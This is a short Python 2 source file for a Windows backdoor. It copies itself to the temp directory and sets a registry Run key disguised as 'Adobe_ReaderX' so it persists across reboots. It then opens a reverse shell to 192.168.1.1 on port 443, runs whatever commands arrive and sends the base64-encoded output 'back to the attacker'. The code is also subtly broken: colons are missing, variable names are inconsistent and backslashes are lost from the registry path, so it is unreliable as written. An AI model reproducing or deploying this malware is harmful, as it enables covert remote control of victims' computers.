import base64
import os
import socket
import subprocess
import sys
from _winreg import *

def autorun(tempdir, fileName, run):
	# Copy the executable shell to the %TEMP% directory
	os.system('Copy %s %s'%(fileName, tempdir))

# Query the Windows registry for key:values
# Adds autorun key to the runkey array
	key = OpenKey(HKEY_LOCAL_MACHINE, run)
	runkey = []
	try:
		i = 0
		while True:
			subkey = EnumValue(key, i)
			runkey.append(subkey[0])
			i += 1
	except WindowsError:
		pass

# Set the autorun key
	if 'Adobe ReaderX' not in runkey:
		try:
			key =OpenKey(HKEY_LOCAL_MACHINE, run,0,KEY_ALL_ACCESS)
			SetValueEx(key , 'Adobe_ReaderX',0,REG_SZ,r"%TEMP%mw.exe")
			key.Close()
		except WindowsError:
			pass

def shell()
# Encode our reverse shell in base64 format
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('192.168.1.1', int(443))) # Remote Host, Port used by server
	s.send('[*] Connection Established! Bring on the tendies!')
	# Loop this five-ever.
	while 1:
		data = s.recv(1024) # Receive the commandline param
		if data == "quit": break
		# Execute command line
		proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE)
		# grab output from the commandline
		stdout_value = proc.stdout.read() + proc.stderr.read()
		# encode the traffic
		encoded = base64.b64encode(stdout_value)
		# Send back to the attacker
		s.send(encoded)
		#s.send(stdout_value)
		## quit out afterwards and kill the socket
	s.close()

def main()
	tempdir = '%TEMP%'
	filename = sys.argv[0]
	run = "SoftwareMicrosoftWindowsCurrentVersionRun"
	autorun(tempdir, fileName, run)
	shell()

if __name__ == "__main__":
	main()